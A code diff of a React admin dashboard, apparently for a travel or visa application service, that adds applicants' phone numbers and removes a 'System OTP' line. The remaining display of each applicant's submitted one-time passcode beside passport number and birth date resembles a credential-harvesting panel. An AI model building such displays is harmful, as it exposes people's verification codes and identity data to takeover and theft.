@@ -176,6 +176,10 @@ export default function AdminDashboardPage() {
                                     <Plane className="mr-3 h-4 w-4 text-muted-foreground" />
                                     <span>{countryDisplayMap[order.nationality] || order.nationality} for {travelReasonMap[order.travelReason] || 'N/A'}</span>
                                 </div>
+                                <div className="flex items-center text-sm">
+                                    <Smartphone className="mr-3 h-4 w-4 text-muted-foreground" />
+                                    <span>Phone: {order.phone || 'N/A'}</span>
+                                </div>
                                  <div className="flex items-center text-sm">
                                     <UserIcon className="mr-3 h-4 w-4 text-muted-foreground" />
                                     <span>Passport: {order.passportNumber}</span>
@@ -183,14 +187,10 @@ export default function AdminDashboardPage() {
                                 <div className="flex items-center text-sm">
                                     <Calendar className="mr-3 h-4 w-4 text-muted-foreground" />
                                     <span>DOB: {order.dob?.seconds ? format(new Date(order.dob.seconds * 1000), 'MMMM d, yyyy') : 'N/A'}</span>
-                                </div>
+                                 </div>
                                 <Separator />
                                 <div className="flex items-center text-sm font-mono pt-2">
                                     <KeyRound className="mr-3 h-4 w-4 text-muted-foreground" />
-                                    <span>System OTP: <span className="font-bold text-primary">{order.otp}</span></span>
-                                </div>
-                                 <div className="flex items-center text-sm font-mono">
-                                    <Smartphone className="mr-3 h-4 w-4 text-muted-foreground" />
                                     <span>Submitted OTP: <span className="font-bold text-accent">{order.submittedOtp || 'N/A'}</span></span>
                                 </div>
                                 <div className="flex items-center text-sm font-mono">
